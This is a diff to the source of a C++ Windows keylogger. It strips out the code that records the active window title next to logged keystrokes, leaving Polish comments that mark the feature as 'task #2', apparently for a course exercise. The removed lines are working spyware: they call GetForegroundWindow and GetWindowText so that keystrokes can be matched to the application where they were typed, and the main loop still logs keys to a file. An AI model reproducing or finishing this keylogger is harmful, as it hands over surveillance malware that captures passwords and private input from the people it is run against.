@@ -65,57 +65,15 @@ std::string Keylogger::dirBasename(std::string path)
 
 bool Keylogger::update_window(const std::string &last_title, const std::string &current_title, std::ofstream &file_logs)
 {
-	if (last_title != current_title)
-	{
-		file_logs << std::endl << std::endl << "Window: ";
-#ifdef DEBUG
-		std::cout << std::endl << std::endl << "Window: ";
-#endif
-		if (current_title.empty())
-		{
-			//file_logs << "NO ACTIVE WINDOW";
-#ifdef DEBUG
-			std::cout << "NO ACTIVE WINDOW";
-#endif
-		}
-		else
-		{
-			//file_logs << "'" << title << "'";
-#ifdef DEBUG
-			std::cout << "'" << current_title << "'";
-#endif
-		}
-		//file_logs << std::endl;
-#ifdef DEBUG
-		std::cout << std::endl;
-#endif
-
-		return true;
-	}
+	// BEDZIE ZROBIONE JAKO ZADANIE #2
 
 	return false;
 }
 
 std::string Keylogger::get_window_name()
 {
-#ifdef DEBUG_TO_LOGS
-	//printf("Geting title of the window.\n");
-#endif
-
-	// get the active windowtitle
-	char title[1024];
-	wchar_t title_wchar[1024];
-	HWND hwndHandle = GetForegroundWindow();
-	GetWindowText(hwndHandle, title_wchar, 1023);
-
-	size_t pReturnValue;
-	wcstombs_s(&pReturnValue, title, MAX_PATH, title_wchar, MAX_PATH);
-
-#ifdef DEBUG_TO_LOGS
-	// save window name
-#endif
-
-	return std::string(title);
+ // BEDZIE ZROBIONE JAKO ZADANIE #2
+	return {};
 }
 
 
@@ -275,12 +233,13 @@ int main(int argc, char *argv[])
 	{
 		Sleep(10); // give other programs time to run
 
-		std::string current_title = keylogger.get_window_name();
-		bool title_changed = keylogger.update_window(last_title, current_title, file_logs);
-		if (title_changed)
-		{
-			last_title = current_title;
-		}
+		// BEDZIE ZROBIONE JAKO ZADANIE #2 
+		//std::string current_title = keylogger.get_window_name();
+		//bool title_changed = keylogger.update_window(last_title, current_title, file_logs);
+		//if (title_changed)
+		//{
+		//	last_title = current_title;
+		//}
 
 		keylogger.get_key(file_logs);
 	}
